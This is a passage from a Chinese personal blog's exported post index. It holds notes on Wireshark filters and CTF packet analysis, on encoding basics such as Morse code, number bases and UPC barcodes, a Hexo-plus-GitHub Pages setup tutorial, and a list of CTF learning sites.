如图为DNS请求与响应，首先DNS将www.baidu.com解析为一个IP地址的数据包（A记录），然后返回一个DNS响应包。 然后有进行TCP三次握手，&lt;img src=”https://img-blog.csdnimg.cn/20190724122654629.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjY4OTM2,size_16,color_FFFFFF,t_70/&gt; 亦可监控本机后台数据，切换捕获对象即可。 wireshark也可分析其他数据包，从文件类型选择查看即可。 wireshark分析器 帧分析器 亦为物理层的数据帧 亦为数据链路层以太网帧头部信息 IPv4分析器 &lt;img src=”https://img-blog.csdnimg.cn/20190724122637698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjY4OTM2,size_16,color_FFFFFF,t_70/&gt; 亦为IP包头部信息 TCP分析器 亦为传输层的TCP头部信息 过滤器的使用在捕获数据包时可以感受到捕获的数据包过多，难以进行分辨，所以需要进行过滤(筛选)。 捕获时的过滤 IP地址 host x.x.x.x 仅捕获到达/来自于x.x.x.x的数据，IPv6类似。 not host x.x.x.x 捕获除x.x.x.x以外的数据。 src host x.x.x.x 捕获来自x.x.x.x的数据 dst host x.x.x.x 捕获到达x.x.x.x的数据 host x.x.x.x host y.y.y.y 捕获x.x.x.x和y.y.y.y的数据。 host www.xxx.com 捕获解析某网站IP地址的数据 IP地址范围 net x.x.x.x: 捕获到达/来自x.x.x.x网络在中的数据，如上，亦有not src dst。 广播地址，ip broadcast 捕获到255.255.255.255的数据。 ip multicast 捕获通过239.255.255.255~244.0.0.0的数据。 dst host ff02::1 捕获所有主机到IPv6多播地址的数据。 dst host ff02::2 捕获所有路由到IPv6多播地址的数据。 广播/多波地址 广播地址，ip broadcast 捕获到255.255.255.255的数据。 ip multicast 捕获通过239.255.255.255~244.0.0.0的数据。 dst host ff02::1 捕获所有主机到IPv6多播地址的数据。 dst host ff02::2 捕获所有路由到IPv6多播地址的数据。 MAC地址 ether host y:y:y:y:y:y 捕获到达/来自y:y:y:y:y:y的数据。 亦有src、dst、not ether用法。 port 53 捕获端口号为53的UDP/TCP数据(典型DNS数据)。 port 80 捕获端口号为80的UDP/TCP数据(典型HTTP数据)。 udp port 67 捕获端口号为67的UDP数据(典型DHCP数据)。 tcp port 21 捕获端口号为21的TCP数据(典型FTP数据)。 portrange 1-80 捕获1~80端口号的UDP/TCP数据。 tcp portrange 1-80 捕获1~80的TCP数据。 ​ 亦可用and、src、dst还有与IP地址连用。 host x.x.x.x and port xx 捕获端口号xx且主机为x.x.x.x的UDP/TCP数据。 捕获特定ICMP数据。互联网控制消息协议ICMP。 icmp 捕获所有ICMP数据。 icmp[0]=8，捕获所有ICMP字段类型为8的数据包(Echo Request)。 icmp[0]=17，捕获所有ICMP字段类型为17的数据包(Address Mask Request)。 亦可用not等等。 显示过滤器即使设置捕获时的过滤器，还是会有很多数据包，所以需要再次过滤。 过滤器语法格式 1Protocol String1 String2 Comparison operator Value Logcial Operations Other expression Proticol:选定协议 String1,String2：协议的子类。 Comparison operators：指定比较运算符。可用C/英文写法。 英文写法 C语言写法 eq == ne != gt &gt; lt &lt; ge &gt;= le &lt;= (包含)contains “” (匹配)——matches “” Logical expressions：指定逻辑运算符 英文写法 C语言写法 and &amp;&amp; or ¦¦ xor ^^ not ! 协议过滤器：包括arp、ip、ipv6、tcp、等协议。 应用过滤器：包括bootp(所有DHCP流量)、dns(包括TCP传输和UDP的DNS请求与响应)、tftp(所有TFTP简单文件传输协议)、http(HTTP命令、响应和数据传输包)、icmp。 字段存在过滤器：bootp.option.hostname(所有DHCP流量，包括主机名)、http.post(包含HTTP主机名称字段的HTTP包)、ftp.request.command(所有FTP命令数据)。 特有过滤器：tcp.analysis.flags(显示所有与TCP标识相关的包，包括丢包、重发)、tcp.analysis.zero_window(被标志的包，来表示发送方缓存空间已满)。 添加列：Packet Details面板的每一段均可作为列、过滤器，便于筛选数据。 举例 http、tcp.pot==80、 bootp(显示DHCP用这个)、dhcpv6(过滤DHCPv6。 ip.src/dst/host/addr、ip.addr==x.x.x.x、ip.host==www.xxx.com、ip.addr&gt;x.x.x.1 &amp;&amp; ip.addr&lt;x.x.x.5 关键词搜索：xxx contains “strings”(xxx可以是字段名、帧)，matches”(?x)xxx”对于首字母不区分大小写。通配符”.”：除换行符和回车外其他字符。xx{1.k}yy，在xx与yy间存在1~k个字符进行筛选。 通信延迟的筛选，tcp.time_delta&gt;1过滤TCP时间差大于1的数据。 CTF中好用的 ctrl+F，分组列表改为分组字节流，显示过滤器改为字符串，输入flag、CTF等等会有不错的收获。 追踪流，可以看到流量信息，在这里保留16进制的文件信息。 确认是文件后，根据文头，通过 导出分组字节流 导出相应文件，(菜刀类型需要去开头和结尾的X@Y，使用wireshark在导出时设置即可)。 [参考文献] [1]王晓卉,李亚伟.WireShark数据包分析实战详解[M],北京:清华大学出版社,2015.","path":"2019/07/24/初始Wireshark/","date":"07-24","excerpt":"wireshark学习的笔记","tags":[{"name":"wireshark","slug":"wireshark","permalink":"https://www.ea6th.top/tags/wireshark/"}]},{"title":"编码笔记","text":"编码学习的笔记 编码学习的笔记密码学从古典密码的替换、置换到机械密码再到现代密码学，这是个漫长的过程。最近看了一本《编码：隐藏在计算机软硬件背后的语言》，对编码有了一些体会，做个笔记。（笔记部分选取书内，） 前言先来个小彩蛋记事本输入“联通”，然后保存，再打开，发现乱码，大概这个样子而“移动”重复这样操作就没有这种情况，戏称为“联通不如移动”。 原因是：而这种情况是因为windows默认编码是GB2312，“联通”的联GB2312编码为\\uc1aa，二进制为110000110101010，是按八位一组与UTF8的编码对应，使得windows误认为是UTF-8的文件。 古典密码CTF上并不是感觉很让人有什么兴趣，毕竟工具多基本上就能出来，但CTF不过是竞赛，与真实世界的模拟还有一定距离，在密码学划了一段时间水后，找到了一些好的资料，蛮有意义。本质上来说，编码更多是的交流，而不是加密保护机密，比如GBK2312的汉语编码，在现在加密更多的是现代密码学。 摩尔斯密码（Morse code）又称为莫斯密码（翻译问题）只有点（bot）和划（dash）的古典密码，应用上有很多替代的方式，比如0和1代替点和划线，中间用/或者空格代替，又或是音频里面其中一个声道的电平可以用来制作摩尔斯密码。特点： 只有两个字符 字符间隔：“.”为1t，“———”为3t，两个之间1t，字符间3t，字间7t。 附上一个快速记下摩尔斯密码的树形图。（原图太模糊，重新做了一个) 进制的转换2进制：Binary8进制：Octal10进制：Decimal16进制：Hexadecimal顾名思义，二进制每个位数为0-1，八进制即为0-7，16进制为0-f（其中a-f代表10-15）。 简单的计算过程：二进制到十进制 如10010， 10010=1\\times2^4+0\\times2^3+0\\times2^2+1\\times2^1+0\\times2^0二进制到十六机制 如10010010 10010010=1001\\times2^4+0010\\times2^0 =1001\\times16+0010\\times1 =(1\\times2^3+0\\times2^2+0\\times2^1+1\\times2^0)\\times16+(1\\times2^1) =9\\times16+2=146诸如此类，根据这种方法即可简单进行手动的进制转换。 关于二进制对于计算机来说，二进制便于快速计算，在计算机基础或者计算机组成原理有介绍，不再记录。推广而言，图片的黑白色、灯泡的开关、声音信号的两种电平等等均可是其妙用，下面的条形码也是一种应用。 条形码==条形码==常用于超市等等地方，作为购物凭证使用，采用了UPC、Code 3等码制，这里介绍UPC(通用产品代码)。上图为例，实际上有用的只有其中的一条窄带，窄带一般包括粗细成比例的黑条和空隙。黑条即为若干个1，空隙为若干个0.==结构介绍== 101 护线：辅助扫描仪定位，亦可知单个比特的黑条和空隙的宽度。 左半部分的数字：六组每组7个比特位的字符串， 01010 中间的护线：内置式检错码，防止被篡改或错印， 右半部分的数字：六组每组7个比特位的字符串 101 最右边的护线：类似于最左边的护线，辅助反向扫描。参考下面进行解码，解码后会得到0 51000 01251 7，与条形码底部数字相同，（当然是为了防止条形码损坏拉）。继续解码 0 第一个数字，数字系统字符 0表示规范的UPC解码，不同重量的货物为2，订单、票卷UPC为5。 51000 制造商代码， 7 最后一个，模校验字符 通过前面11位计算得到 前面11个数字用字母代替为A BCDEF GHIJK X=3\\times(A+C+E+G+I+K)+(B+D+F+H+J)紧邻X并大于X的10的整数倍-X得到模校验字符 ==有趣的地方==原书提到用摩尔斯电码表示UPC代码，如“Hi,there”就相当于，一个很有意思的地方。 逻辑 +表示or，×表示and，1-表示not关于计算机的二进制计算原理基于一个仅能计算二进制加法的机器，如何能计算减法、乘法等等呢？ 先通过逻辑门电路构建与、或、非，输出根据数值位置分为进位输出和和输出。减法通常来说需要使用借位的方法，高位去1，但是计算机来说，很难实现，所以相对于加法采用了不同的方法， 253-176相当于253-176+999+1-1000，运行时为253+(999-176)+1-1000， 176-253相当于999-253+176-999， 二进制时用全为1的数代替即可， 对于负的二进制来说，和计算机基础或者计算机组成原理一样，去一个最高位为符号位，只要确定最高有多少位即可，通过补数计算，相当于-128和127实际上在二进制里面只差了1而已。 计算某个数的负数二进制简单办法：先表示正数二进制，然后去反码然后加1。如此构成了一个能计算加法和减法的机器，一个痛点是在==不确定为无符号数还是有符号位数时，你无法确定一个二进制数到底是多少==，比如1001既可以是9也可能是-7。 字符与进制八个二进制数相当于两个十六进制数，相当于一个字符，也就是ASCII码，好像所有人都用它，但是实际上IBM的系统采用的就不一样，为EBCDIC字符。后面还有1988年研究的Unicode编码，采用了16位编码，表示65536个不同的字节，0000h—007Fh与ASCII一致，后面收录了很多其他国家的标准。而且Unicode相对于ASCII码进行编码会存在占用更多内存，也不少一个可以忽略的事实。 后面的章节虽然后面计算机历史很有意思，但是太过于繁琐，了解即可，不再赘述，再后面就是汇编之类，直接参考王爽的汇编语言更好。 结束语你可能从这本书学到很高级的编码，但是更多是学习对于编码还有计算机的理解。 (美)查尔斯•佩措尔德著. 编码:隐匿在计算机软硬件背后的语言[M].左飞译. 电子工业出版社 (日)结城浩著. 程序员的数学[M].管杰译. 人民邮电出版社","path":"2019/06/23/编码笔记/","date":"06-23","excerpt":"编码学习的笔记","tags":[{"name":"编码","slug":"编码","permalink":"https://www.ea6th.top/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"hexo搭建你的博客","text":"hexo+GitHub搭建免费博客 使用GitHub+hexo搭建你的博客。hexo概述通过Markdown解析文章生成静态网页的博客框架。 环境配置(==WinDows下==)如果你已经将下面程序配置完成，可跳过。安装过程傻瓜式不再赘述，下面即为官网地址，自主下载即可，当然，由于众所周知的原因，速度会较慢，可自寻其他方式下载。 Git Note.js 安装完成后或是不知道是否安装过可使用cmd命令查询是否安装。 1nodejs --v 能够有Nodejs和Git的即为安装成功。用Git Bash也能检测Node版本。 1node --vision hexo安装及本地生成环境配置完成后开始使用npm安装==如果没有使用代理，请将下面的npm全部换成cnpm避免无法应答==感谢一下万能的npm的淘宝镜像打开Git Bash，输入下面的代码， 1$ npm install -g hexo-cli 待hexo安装完成，执行下面命令，安装所需要的hexo文件（括号内为命令解释） 123$ hexo init $ cd _选择文件位置_$ npm install _确定无误后，开始安装_ 测试内嵌斜体 当然如果选择文件位置你可以在你需要安装的位置右键git bsash_，这样在$ cd时回车即可，也可以顺便选择一个位置，然后在$ cd _后不断修改路径，其中你所在的位置在如下图。等待命令完成后，文件位置会出现下面的文件及其路径。 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts _这个文件有的可能缺失，并不影响_ | └── _posts└── themes 注： config.yml为主题配置文件。 themes内为主题文件，在修改主题文件记得和.config.yml的名字统一。 source内为内容目录，在博客文章、404内容等等在这里。 启动服务器在路径上命令行Git bash输入下面命令。 1$ hexo s 若干秒后出现下面界面，浏览器访问http://localhost:4000/可以看到你初始的本地博客。 ctrl+C可关闭。注： hexo s等同于hexo server，记住这个命令，在最后搭建完你的博客后需要修改样式时，这是个好助手，它可以在你出现失误时不至于从零开始。 截止到这一步，你已经完成了本地的hexo博客。 上传你的hexo博客到服务器如果你想在网络上寻找到你的博客，你需要一个域名和域名解析，还有一个服务器。下面是几种方案去搭建。 方案一：GuthubPages 通过Github的pages托管服务还有账号仓库去在网络上建立你的博客。 创建你的账号，不懂的或者~ 创建你的仓库（repository），仓库名字为: Github账号名称.github.io。类似于下图： 3. 添加SSH kye，让你的电脑与Github账号连接 回车有个文件位置记录一下，然后遇(yes/no)输入yes，其他回车即可，会在记录的文件位置出现id_rsa.pub文件，复制粘贴到Github的，确认即可。New SSH Key一般在账户——settings——SSH and GPG keys。 测试是否成功添加 $ ssh -T git@github.com $ yes 安装 hexo-deployer-git 插件， $ npm install hexo-deployer-git –save 修改_config.yml，修改为： DeploymentDocs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: git@github.com:/.github.io.git branch: master注：repo:后面为ssh地址，不是http地址。 开始上传文件到Github（括号内为命令解释） $ hexo g （生成静态文件）$ hexo d （生成后部署网站）返回INFO Deploy done: git即为成功。 等待~，浏览器访问可访问https://你的Github账号.github.io 你的网站已经搭建在GithubPages上，域名为https://你的Gituhb账号.github.io 这种方法无须成本，储存太多会卡顿。域名只能是你Github名字 ~ 方案二：域名+GithubPages在方案一的基础上使用自己的域名使之可更换 当然是域名了，自己购买，一般.com/.cn等等较贵，.top等等便宜，可选择阿里云、腾讯云等等。 域名解析 域名解析可以选择自行购买或者找附带的。 免费解析的是 ，不想购买域名解析的非腾讯云可以域名转入，也可以单独购买（廉价）。 - 域名解析设置 类型为CNAME； 主机记录值为域名前缀，填写www或者不填均可； 记录值为 你的Github账号.github.io; 解析线路，默认即可。 如有不同需求，搜索域名解析设置即可。 GitHub及其本地设置 GitHub仓库设置——你的github账户.github.io——settings——GitHub Pages——Custom domain，输入你的域名即可（主机记录值有www填www.，没有就直接填） 本地设置站点目录的source文件夹，创建并打开CNAME（记事本打开即可），输入你的域名，（和仓库的一样），保存即可。 等待，等到浏览器可以访问自己的域名~。 这种方法你的博客仍在GitHub上，和方案一一样，不过是域名解析把申请访问你的域名的跳转到你的GitHub仓库里面。 主题选择与优化更换电脑后的恢复步骤安装node.js、git、hexo-cli 123456789101112131415161718192021hexo init filenamecd filenamecnpm installgit clone https://github.com/yiluyanxia/hexo-theme-antiquity.gitgit clone https://github.com/ZEROKISEKI/hexo-theme-gal.git themes/gal#参考 https://github.com/ZEROKISEKI/hexo-theme-galcnpm install hexo-admin --savecnpm install hexo-helper-live2d --savecnpm install live2d-widget-model-hibiki#gal主题不蒜子添加方法大型设备详细文章——tag-articel的末尾部分（前面的tag结束）&lt;span class=&quot;label label-gal&quot;&gt; &lt;p id=&quot;busuanzi_value_page_pv&quot; class=&quot;fa fa-eye&quot;&gt;&lt;/p&gt; &lt;/span&gt;安装mathjax","path":"2019/05/25/hexo搭建博客/","date":"05-25","excerpt":"hexo+GitHub搭建免费博客","tags":[{"name":"hexo","slug":"hexo","permalink":"https://www.ea6th.top/tags/hexo/"}]},{"title":"CTF新人入坑指南","text":"带新人入坑，顺便整理笔记 推荐学习路线WEB方面推荐咨询Vul_Ghost 简单提一下方向问题推荐逆向、web至少一个，准备打CTF的话，杂项和密码学虽然也行，但实际上这个后期并不是很好单走的，辅助型比较多（当然入门级比赛这两个还是蛮爽的）。逆向初步，知道指令、堆、栈还有OD、IDA简单使用（王爽的x86汇编语言是不错的、C++黑客编程也是不错的）——OD、IDA初步调试——OD、IDA去壳等等。 初步了解一般是以CTF赛进行练习CTF介绍，https://ctf-wiki.github.io/ctf-wiki/introduction/resources/ 关于CTF介绍安全职位介绍https://www.sec-wiki.com/skill 注意职位要求，相当于学习路线 推荐网站多是资讯和技能表区 吾爱破解 https://www.52pojie.cn/ 每隔一段时间会开放注册 看雪论坛 https://www.kanxue.com/ 比上面那个网站好看！！！ tools（又称吐司） https://www.t00ls.net/ 玩安全无吐司帐号门未入 freebuf https://www.freebuf.com/ 先知 https://xz.aliyun.com/ 嘶吼 https://www.anquanke.com/ 安全客 https://www.4hou.com/ nosec https://nosec.org/home/index secwiki https://www.sec-wiki.com/ 知道创宇 http://blog.knownsec.com/ 有技能表等等编程方面C语言中文网 http://c.biancheng.net/cpp/ 这个普通教程看完理解就差不多了C++ 推荐C++ primer plus 没基础不推荐先看这个 部分训练平台合天网安 http://www.hetianlab.com/ 最近改了制度，但是里面的实验不错实验吧 http://www.shiyanbar.com/ctf/ 也有实验蓝鲸 http://www.whaledu.com/i春秋 https://www.ichunqiu.com/ 一言难尽 CTF训练平台（CTF参见一开始的ctfwiki）以下排名不分难度掘安， https://ctf.jasec.cn合天 http://www.hetianlab.com/Bugku https://ctf.bugku.com/ 题目好像好久没更新的，入门级 https://training.majorleaguecyber.org/ http://sus.njnet6.edu.cn/ https://www.jarvisoj.com/攻防世界 https://adworld.xctf.org.cn/ 西电搞的，PWN专场 https://pwnable.kr/play.php 感受pwn的痛苦吧逆向游戏（全英文） https://microcorruption.com/login国外 https://exploit-exercises.com/ 其他类型的网站http://hackhat.net/菜鸟教程 https://www.runoob.com/W3school http://www.w3school.com.cn/Hacher News https://news.ycombinator.com/啊哈编程 https://www.codeaha.com/一个导航 http://code.giffox.com/慕课网 https://www.imooc.com/ 题外话希望不是个脚本小子，而是懂其原理，知其用法， 很多社交平台都有安全大佬在玩，可以慢慢去发现比如微博、知乎。除了上面的，还有很多软技能，github，写博客的MarkDown、提问的艺术等等。","path":"2019/05/25/CTF新人入坑指南/","date":"05-25","excerpt":"带新人入坑，顺便整理笔记","tags":[]}],"categories":[],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://www.ea6th.top/tags/sqlmap/"},{"name":"sql","slug":"sql","permalink":"https://www.ea6th.top/tags/sql/"},{"name":"PHP","slug":"PHP","permalink":"https://www.ea6th.top/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://www.ea6th.top/tags/XSS/"},{"name":"python3","slug":"python3","permalink":"https://www.ea6th.top/tags/python3/"},{"name":"Burpsuite","slug":"Burpsuite","permalink":"https://www.ea6th.top/tags/Burpsuite/"},{"name":"笔记","slug":"笔记","permalink":"https://www.ea6th.top/tags/%E7%AC%94%E8%AE%B0/"},{"name":"密码学","slug":"密码学","permalink":"https://www.ea6th.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"树莓派","slug":"树莓派","permalink":"https://www.ea6th.top/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"},{"name":"上传","slug":"上传","permalink":"https://www.ea6th.top/tags/%E4%B8%8A%E4%BC%A0/"},{"name":"掘安CTF","slug":"掘安CTF","permalink":"https://www.ea6th.top/tags/%E6%8E%98%E5%AE%89CTF/"},{"name":"linux","slug":"linux","permalink":"https://www.ea6th.top/tags/linux/"},{"name":"Git","slug":"Git","permalink":"https://www.ea6th.top/tags/Git/"},{"name":"wireshark","slug":"wireshark","permalink":"https://www.ea6th.top/tags/wireshark/"},{"name":"编码","slug":"编码","permalink":"https://www.ea6th.top/tags/%E7%BC%96%E7%A0%81/"},{"name":"hexo","slug":"hexo","permalink":"https://www.ea6th.top/tags/hexo/"}]}